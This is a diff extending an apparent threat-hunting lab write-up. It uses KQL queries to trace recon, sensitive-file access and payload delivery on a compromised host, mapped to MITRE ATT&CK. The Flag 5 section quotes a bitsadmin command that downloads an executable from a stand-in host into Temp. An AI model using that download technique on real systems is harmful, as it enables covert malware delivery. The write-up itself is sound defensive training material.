@@ -147,3 +147,188 @@ DeviceProcessEvents
 | order by Timestamp asc
 ```
 <img width="1841" height="202" alt="image" src="https://github.com/user-attachments/assets/923d1275-7ad0-4c61-ab27-00aa7cf07696" />
+
+## 🏴Flag 2 - Reconnaissance Script Hash
+
+<img width="636" height="282" alt="image" src="https://github.com/user-attachments/assets/f1ebdc3e-f433-4987-bb22-003825a46891" />
+
+
+### **Findings**
+
+I filtered `DeviceProcessEvents` for known recon commands like `whoami`, `systeminfo`, and `netstat`, then projected the `SHA256` field to capture the hashes.
+
+The earliest match occurred at **05:56:58 UTC on 16 June 2025**, where the attacker ran:
+
+```bash
+"cmd.exe" /c whoami
+```
+
+The SHA256 for this binary is:
+
+```bash
+badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
+```
+
+This cmd.exe execution aligns with the attack timeline and appears to mark the intruder mapping out system-level context post-compromise.
+
+### **MITRE ATT&CK Technique**
+
+- **Technique:** [**T1082 – System Information Discovery**](https://attack.mitre.org/techniques/T1082/)
+- **Tactic:** Discovery
+- **Description:** The attacker executed `whoami` via `cmd.exe` to determine the current user’s context on the system, standard reconnaissance behaviour mapped to T1082.
+
+### **KQL Query**
+```
+DeviceProcessEvents
+| where DeviceName contains "michaelvm"
+| where Timestamp between (ago(30d) .. now())
+| where ProcessCommandLine has_any ("systeminfo", "ipconfig", "whoami", "netstat", "Get-Process", "Get-Service", "Get-LocalUser", "Get-LocalGroup", "Get-WmiObject", "gwmi")
+| project
+    Timestamp,
+    DeviceName,
+    AccountName,
+    FileName,
+    ProcessCommandLine,
+    FolderPath,
+    SHA256
+| order by Timestamp asc
+```
+<img width="1644" height="205" alt="image" src="https://github.com/user-attachments/assets/93b52896-e0c1-412b-a80b-355379765d13" />
+
+## 🏴Flag 3 - Sensitive Document Access
+
+<img width="641" height="323" alt="image" src="https://github.com/user-attachments/assets/4d092346-cec5-4727-a13d-2bac63ca1e2a" />
+
+### Findings
+
+To uncover the attacker’s access to sensitive documents, I queried `DeviceFileEvents` on `michaelvm`, focusing on files or directories containing the keyword `"board"` as hinted in the challenge.
+
+The KQL returned 36 file creation events. Among them, two stood out:
+
+- `BoardMinutes.lnk` (created under `AppData\Roaming\Microsoft\Windows\Recent`)
+- `QuarterlyCryptoHoldings.docx` (created in `Documents\BoardMinutes\`)
+
+The `.lnk` file indicates recent user interaction with `BoardMinutes.docx`, and the folder path includes the word “Board,” aligning with the hint. However, the file `QuarterlyCryptoHoldings.docx` is the more likely target. It contains “crypto” in the name, matches the financial motive described in the “What to Hunt” section, and was accessed during the attack window on **16 June 2025 at 05:57 UTC**.
+
+Based on name, timing, and context, I concluded this is the intended sensitive file.
+
+### **MITRE ATT&CK Technique:**
+
+- **Technique:** [**T1005 – Data from Local System**](https://attack.mitre.org/techniques/T1005/)
+- **Tactic:** Collection
+- **Description:** The attacker interacted with internal financial documents such as `QuarterlyCryptoHoldings.docx`, indicating local data staging for potential exfiltration, behaviour consistent with T1005.
+
+### **KQL Query**
+```
+DeviceFileEvents
+|where DeviceName contains "michaelvm"
+//| where DeviceName contains "centralsrvr"
+//| where FileName endswith ".lnk"
+| where Timestamp between (ago(30d) .. now())
+| where FileName contains "board" or FolderPath contains "board"
+| project
+    Timestamp,
+    DeviceName,
+    FileName,
+    FolderPath,
+    ActionType
+| order by Timestamp asc
+```
+<img width="1509" height="818" alt="image" src="https://github.com/user-attachments/assets/5e63c957-74f8-4e9a-be53-955ec8cc4c9c" />
+
+## 🏴Flag 4 - Last Manual Access to File
+
+<img width="638" height="276" alt="image" src="https://github.com/user-attachments/assets/c5839f17-3899-4b89-927e-e43a68e52c45" />
+
+### Findings
+
+To determine the last manual access to the sensitive document, I filtered `DeviceEvents` for activity on the `michaelvm` host, specifically targeting file access involving `QuarterlyCryptoHoldings.docx`.
+
+The most recent `SensitiveFileRead` action occurred at: **`16 Jun 2025 06:12:28`**,
+
+**File:** `QuarterlyCryptoHoldings.docx`
+
+**Initiating Process:** `wordpad.exe`
+
+**Command Line:**
+
+```
+"WORDPAD.EXE" "C:\Users\Mich34L_id\Documents\BoardMinutes\QuarterlyCryptoHoldings.docx"
+```
+
+This access was initiated using `wordpad.exe`, suggesting the attacker manually viewed the contents of the document. Based on timeline analysis, this event occurred shortly before other indicators of potential exfiltration, aligning with the attacker’s final stage behaviour.
+
+### **MITRE ATT&CK Technique:**
+
+- **Technique:** [**T1005 – Data from Local System**](https://attack.mitre.org/techniques/T1005/)
+- **Tactic:** Collection
+- **Description:** The attacker manually accessed `QuarterlyCryptoHoldings.docx` using `wordpad.exe`, confirming the collection of sensitive local data prior to exfiltration. This behavior aligns with T1005.
+
+### **KQL Query**
+```
+DeviceEvents
+|where DeviceName contains "michaelvm"
+| where Timestamp between (ago(30d) .. now())
+| where FileName contains "QuarterlyCryptoHoldings"
+| project Timestamp, DeviceName, FileName, FolderPath, ActionType
+| order by Timestamp desc
+
+DeviceEvents
+|where DeviceName contains "michaelvm"
+| where Timestamp between (ago(30d) .. now())
+| where FileName contains "QuarterlyCryptoHoldings"
+| project
+    Timestamp,
+    DeviceName,
+    ActionType,
+    FileName,
+    FolderPath,
+    InitiatingProcessFileName,
+    InitiatingProcessCommandLine
+| order by Timestamp desc
+```
+<img width="1842" height="563" alt="image" src="https://github.com/user-attachments/assets/79d2332c-8916-40d4-a59d-5201c9451139" />
+
+## 🏴Flag 5 - LOLBin Usage: bitsadmin
+
+<img width="639" height="277" alt="image" src="https://github.com/user-attachments/assets/9b05a8be-b81d-434e-a77e-27ed2ec83b7e" />
+
+### Findings
+
+To uncover LOLBin abuse on the compromised host `michaelvm`, I queried `DeviceProcessEvents` for instances where **`bitsadmin.exe`** executed with an **HTTP or HTTPS URL**, a known LOLBin pattern.
+
+This search returned three results. The key entry was:
+
+```bash
+"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe
+```
+
+This reveals that the attacker used `bitsadmin.exe` to download `crypto_toolkit.exe` into a `Temp` directory. This technique blends malicious activity with legitimate Windows behaviour and is commonly used for **stealthy initial payload delivery**.
+
+After the download, the attacker relocated the binary, likely an attempt at **defence evasion.**
+
+### **MITRE ATT&CK Techniques**
+
+- **Technique:** [**T1105 – Ingress Tool Transfer**](https://attack.mitre.org/techniques/T1105/)
+    
+    **Tactic:** Command and Control
+    
+    **Description:** The attacker used `bitsadmin.exe` to download a remote payload (`crypto_toolkit.exe`), leveraging a trusted native utility to blend malicious actions with legitimate system activity.
+    
+- **Technique:** [**T1564.001 – Hide Artifacts: Hidden Files and Directories**](https://attack.mitre.org/techniques/T1564/001/)
+    
+    **Tactic:** Defense Evasion
+    
+    **Description:** The downloaded payload was staged in `AppData\Local\Temp`, a benign-looking directory often used by threat actors to avoid detection during manual inspection or regular scans.
+    
+
+### **KQL Query**
+```
+DeviceProcessEvents
+|where DeviceName contains "michaelvm"
+| where FileName =~ "bitsadmin.exe"
+| where ProcessCommandLine has_any ("http", "https")
+| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp desc
+```
+<img width="1694" height="332" alt="image" src="https://github.com/user-attachments/assets/62f4b935-f2b3-4f49-9c90-85d941b40316" />
